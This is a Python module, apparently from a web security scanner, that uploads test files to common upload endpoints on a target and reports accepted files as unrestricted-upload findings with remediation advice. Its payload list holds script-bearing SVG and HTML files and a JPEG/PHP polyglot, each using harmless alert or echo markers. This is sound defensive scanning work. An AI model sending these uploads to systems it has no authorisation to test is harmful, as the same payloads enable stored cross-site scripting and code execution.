"""File upload — tries malicious file types on discovered upload endpoints."""
import secrets
from fastapi import APIRouter, Depends
from tools._shared import (ScanRequest, verify_scan_quota, web_url,
                            safe_request, wrap_finding, standard_response)
from tools._spa_state import load_spa_state

router = APIRouter()

_UPLOAD_PATHS = [
    "/api/upload", "/api/users/avatar", "/api/users/profile-image",
    "/api/Users/upload", "/api/Feedbacks", "/api/feedbacks",
    "/upload", "/api/files", "/api/v1/upload",
    "/api/images", "/api/Photos",
]

# Malicious file payloads — name, content-type, content, marker
_PAYLOADS = [
    ("vlxss.svg", "image/svg+xml",
     b'<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><script>alert("VLXSS")</script></svg>',
     "VLXSS"),
    ("vlxss.html", "text/html",
     b'<html><script>alert("VLXSS")</script></html>', "VLXSS"),
    ("polyglot.jpg.php", "image/jpeg",
     b'\xff\xd8\xff\xe0\x00\x10JFIF<?php echo "VLXSS_PHP"; ?>', "VLXSS_PHP"),
]


@router.post("/api/scan/file_upload")
async def scan_file_upload(req: ScanRequest, _=Depends(verify_scan_quota)):
    base = web_url(req.target).rstrip("/")
    spa = load_spa_state(req.target)
    endpoints = set(_UPLOAD_PATHS)
    for url, info in (spa.get("endpoints") or {}).items():
        if isinstance(info, dict) and "POST" in (info.get("methods") or []):
            low = url.lower()
            if any(k in low for k in ("upload", "avatar", "image", "photo", "file", "feedback")):
                path = url.replace(base, "") if url.startswith(base) else url
                if path.startswith("/"):
                    endpoints.add(path)

    findings, tests, confirmed = [], 0, []
    for endpoint in list(endpoints)[:10]:
        url = base + endpoint
        for filename, ctype, content, marker in _PAYLOADS:
            tests += 1
            files = {"file": (filename, content, ctype)}
            r = safe_request("POST", url, req=req, allow_redirects=False, timeout=10,
                              data={"file": files})  # multipart via files in headers won't work via safe_request — use raw requests
            # Use requests directly for multipart upload
            try:
                import requests
                from tools._shared import make_req_headers
                h = make_req_headers(req)
                h.pop("Content-Type", None)  # let requests set multipart boundary
                r = requests.post(url, files=files, headers=h, timeout=10,
                                   verify=False, allow_redirects=False)
            except Exception:
                continue
            if r is None or r.status_code not in (200, 201, 202):
                continue
            findings.append(wrap_finding(
                f"Dangerous file accepted at POST {endpoint} — {filename} ({ctype})",
                "HIGH", cvss="8.1", cwe="CWE-434", owasp="A04:2021",
                remediation=("Validate uploaded file types by content (magic bytes) not extension. "
                           "Reject SVG/HTML uploads or strip <script> tags. Store in a path that "
                           "cannot be served as executable."),
                evidence_marker=f"POST {endpoint} with {filename} returned {r.status_code}; marker={marker}"))
            confirmed.append({"path": endpoint, "filename": filename,
                              "ctype": ctype, "status": r.status_code})
            break  # one finding per endpoint

    return standard_response(tool="file_upload", target=req.target,
        findings=findings, tests_performed=tests,
        tests_summary=f"File Upload: {tests} probes across {len(list(endpoints)[:10])} endpoints with {len(_PAYLOADS)} payload types",
        raw_data={"file_upload": {"confirmed": confirmed}})


def register(app):
    app.include_router(router)
